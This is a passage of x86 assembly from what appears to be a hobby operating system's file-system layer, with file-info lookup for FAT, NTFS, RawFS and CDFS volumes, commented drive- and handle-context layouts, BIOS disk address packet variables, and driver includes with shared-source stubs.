cmp [Drive_Context+0Ah],byte 12                                                 ; FAT?
je Get_File_Info_FAT
cmp [Drive_Context+0Ah],byte 16
je Get_File_Info_FAT
cmp [Drive_Context+0Ah],byte 32
je Get_File_Info_FAT

mov ecx,1                                                                       ; device type = Hard drive
cmp [Drive_Context + 0Ah],byte 'R'                                              ; RawFS?
je Get_File_Info_RawFS
mov ecx,2                                                                       ; device type = removable media
cmp [Drive_Context + 0Ah],byte 'C'                                              ; CDFS?
je Get_File_Info_RawFS

xor eax,eax

Get_File_Info_Exit:
mpop ds, esi, es, edi, edx
leave

ret 4

Get_File_Info_NTFS:

; Sector Number = LCN * Sectors per Cluster
mov ebx,[si + 4]                                                                ; Start cluster VCN
movzx ecx,byte [Drive_Context + 0Bh]
imul ebx,ecx                                                                    ; -> sector
add ebx,dword [Drive_Context + 0]

mov eax,[si + 29]                                                               ; size
mov ecx,1                                                                       ; device type = Hard drive
jmp Get_File_Info_Exit

Get_File_Info_FAT:
mov eax,[si + 4]                                                                ; start cluster
call Get_FATSecNum_Offset                                                       ; -> sector
mov ebx,eax
add ebx,dword [Drive_Context + 0]
mov eax,[si + 17 +18]                                                           ; size
mov ecx,1                                                                       ; device type = Hard drive
jmp Get_File_Info_Exit

Get_File_Info_RawFS:
mov eax,[si + 8]                                                                ; size
mov ebx,[si + 4]                                                                ; sector
add ebx,dword [Drive_Context + 0]
jmp Get_File_Info_Exit
















; Drive Buffer


; Offset   Size    Group     Sub Group     Name
; -----------------------------------------------------------------------------------------
; 00h      dword   Drive                   Partition Start Sector (if used, otherwise set to zero)
; 04h      word    Drive     new used      bytes per sector
; 06h      dword   Drive     unused        Total Sectors
; 0Ah      byte    Drive                   Drive Type
;                                           'N' = NTFS                12 = FAT12
;                                           'P' = raw partition       16 = FAT16
;                                           'H' = raw hard disk       32 = FAT32
;                                           'F' = raw floppy disk
;                                           'M' = raw removable-media (CD/DVD/BD)
;                                           'R' = RawFS
;                                           'C' = CDFS
; -----------------------------------------------------------------------------------------
; 0Ah      byte    FAT                     Type
; 0Bh      byte    FAT                     Sectors per Cluster
; 0Ch      word    FAT                     dwords per Sector
; 0Eh      dword   FAT                     dwords per Cluster [unused]
; 12h      dword   FAT                     first data sector
; 16h      dword   FAT       12/16/32      first root directory sector
; 1Ah      word    FAT       12/16         last root directory sector
; 1Ch      word    FAT                     File Allocation Table (= reserved sector count)
; -----------------------------------------------------------------------------------------
; 0Ah      byte    NTFS                    Version [not set! already used as Drive Type, 'N']
;                                             10h   NTFS 1.X   Windows NT 3.1, 3.5 and 3.51
;                                             20h   NTFS 2.X   Windows NT 4.0
;                                             30h   NTFS 3.0   Windows 2000
;                                             31h   NTFS 3.1   Windows XP, Windows Server 2003, Windows Vista
; 0Bh      byte    NTFS                    Sectors per Cluster
;                                              1    512 MB or less
;                                              2    512 MB - 1024 MB
;                                              4    1024 MB - 2048 MB
;                                              8    2048 MB and more
; 0Ch      word    NTFS                    Bytes per Sector = 512
; 0Eh      byte    NTFS                    Clusters per File Record
;                                             This can be negative, which means that the size of the MFT
;                                             record is smaller than a cluster. In this case the size of the
;                                             MFT record in bytes is equal to 2^(-1 * Clusters per MFT Record).
; 0Fh      dword   NTFS                    Sector Offset of $MFT
; 13h      byte    NTFS                    Clusters per Index Record
;                                             This can be negative, which means that the size of the Index
;                                             record is smaller than a cluster. In this case the size in bytes
;                                             is equal to 2^(-1 * Clusters per Index Record).
; 1Ah      word                            
; 1Ch      word                            
; -----------------------------------------------------------------------------------------
; 0Bh      dword   CDFS                    Type L Path Table Occurence (LBA)
; 0Fh      dword   CDFS                    Path Table Size (in bytes)
; 13h      dword   CDFS                    Volume Space Size (in sectors)
; -----------------------------------------------------------------------------------------
; 1Eh      byte    Drive                   BIOS disk number
; -----------------------------------------------------------------------------------------
; 1Fh                                      a Drive Buffer
; -----------------------------------------------------------------------------------------


; Handle Context

; 0         dword   Pointer to Device Context

; 4   FAT   dword   Start Cluster
; 8   FAT   dword   Current Cluster
; 12  FAT   dword   Current Byte Position
; 16  FAT   byte    Attribute Flags
; 17  FAT   System File Information (32 bytes)
;     FAT   +18 = File Size
;     FAT   +12 = 'read', 'writ', 'norm'
;     NTFS      = 'load', 'read', 'writ', 'norm'        [DEPRECATED]

; 4   NTFS  qword   Start Cluster VCN
; 12  NTFS  dword   Current Byte Position
; 17  NTFS  'load', 'open', '$pen'
; 21  NTFS  qword   Last read MFT File Record number
; 29  NTFS  qword   File Size

; 4   RawFS dword   Start Sector
; 8   RawFS dword   Size of File
; 12  RawFS dword   Current Byte Position

; 4   CDFS  dword   Sector Number
; 8   CDFS  dword   Size of File
; 12  CDFS  dword   Current Byte Position
; 16  CDFS  dword   Access mode: 'load', 'open'

; [undocumented, see ToasterOS]



Device_Context_Count            dd      0     ; count of device contexts on the handle buffer
Handle_Context_Count            dd      0     ; count of handle contexts on the handle buffer
Last_Device_Context             dw      0     ; caching for speeding up purposes
Last_Handle_Context             dw      0     ; caching for speeding up purposes


%ifdef _DEBUG
Warning_No_Drives_Mounted       db      "Warning: No drives mounted, file system will not be available", 0
Debug_Message_Mount_RawFS       db      "  > RawFS volume", 0
Debug_Message_Mount_CDFS        db      "  > CDFS volume", 0
Debug_Message_Mount_NTFS        db      "  > NTFS volume", 0
Debug_Message_Mount_FAT         db      "  > FAT volume", 0
%endif

; int 13h variables
Disk_Address_Packet_Size      db  10h   ; +00h
Disk_Address_Packet_Reserved  db  0     ; +01h
Disk_Address_Packet_Count     dw  1     ; +02h
Disk_Address_Packet_Buffer    dd  0     ; +04h
Disk_Address_Packet_LBA_Low   dd  0     ; +08h
Disk_Address_Packet_LBA_High  dd  0     ; +0Ch












; include the disk device driver
%include "Disk Device Driver.asm"

%ifndef _SHARED_SOURCE_VERSION

; include the FAT file system driver
%include "FAT driver.asm"

; include the NTFS file system driver
%include "NTFS driver.asm"

; include the CDFS file system driver
%include "CDFS driver.asm"

%endif

; include the RawFS file system driver
%include "RawFS driver.asm"


%ifdef _SHARED_SOURCE_VERSION

Read_File_FAT:
Read_File_NTFS:
Read_File_CDFS:
Load_System_File_NTFS:
Load_File_CDFS:
Open_File_FAT:
Seek_File_FAT:
Get_FATSecNum_Offset:
Determine_FAT_Type:
xor eax,eax
stc

ret

%endif


